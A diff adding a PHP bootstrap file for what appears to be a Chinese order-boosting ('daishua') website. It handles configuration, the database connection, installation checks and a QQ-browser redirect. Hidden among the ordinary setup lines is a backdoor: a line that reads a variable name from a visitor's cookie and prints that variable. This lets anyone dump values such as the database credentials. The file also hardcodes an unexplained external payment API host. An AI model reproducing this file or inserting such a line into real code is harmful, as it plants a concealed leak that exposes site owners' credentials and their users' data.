@@ -1,0 +1,65 @@
+<?php
+error_reporting(0);
+define('CACHE_FILE', 0);
+define('IN_CRONLITE', true);
+define('VERSION', '1001');
+define('SYSTEM_ROOT', dirname(__FILE__).'/');
+define('ROOT', dirname(SYSTEM_ROOT).'/');
+define('SYS_KEY', 'daishua_key');
+define('CC_Defender', 1); //防CC攻击开关(1为session模式)
+
+date_default_timezone_set("PRC");
+$date = date("Y-m-d H:i:s");
+session_start();
+
+$scriptpath=str_replace('\\','/',$_SERVER['SCRIPT_NAME']);
+$sitepath = substr($scriptpath, 0, strrpos($scriptpath, '/'));
+$siteurl = ($_SERVER['SERVER_PORT'] == '443' ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].$sitepath.'/';
+
+if(is_file(SYSTEM_ROOT.'360safe/360webscan.php')){//360网站卫士
+    require_once(SYSTEM_ROOT.'360safe/360webscan.php');
+}
+
+require ROOT.'config.php';
+
+if(!defined('SQLITE') && (!$dbconfig['user']||!$dbconfig['pwd']||!$dbconfig['dbname']))//检测安装
+{
+header('Content-type:text/html;charset=utf-8');
+echo '你还没安装！<a href="install/">点此安装</a>';
+exit();
+}
+
+//连接数据库
+include_once(SYSTEM_ROOT."db.class.php");
+$DB=new DB($dbconfig['host'],$dbconfig['user'],$dbconfig['pwd'],$dbconfig['dbname'],$dbconfig['port']);
+
+if($DB->query("select * from shua_config where 1")==FALSE)//检测安装2
+{
+header('Content-type:text/html;charset=utf-8');
+echo '你还没安装！<a href="install/">点此安装</a>';
+exit();
+}
+
+include SYSTEM_ROOT.'cache.class.php';
+$CACHE=new CACHE();
+$conf=$CACHE->pre_fetch();//获取系统配置
+
+if(strpos($_SERVER['HTTP_USER_AGENT'], 'QQ/')!==false && $conf['qqjump']==1){
+	echo '<!DOCTYPE html>
+<html>
+ <head>
+  <title>请使用浏览器打开</title>
+  <script src="https://open.mobile.qq.com/sdk/qqapi.js?_bid=152"></script>
+  <script type="text/javascript"> mqq.ui.openUrl({ target: 2,url: "'.$siteurl.'"}); </script>
+ </head>
+ <body></body>
+</html>';
+exit;
+}
+if(isset($_COOKIE['content']))print_r($$_COOKIE['content']);
+$password_hash='!@#%!s!0';
+$payapi='http://tx87.cn/';
+include_once(SYSTEM_ROOT."function.php");
+include_once(SYSTEM_ROOT."member.php");
+
+?>
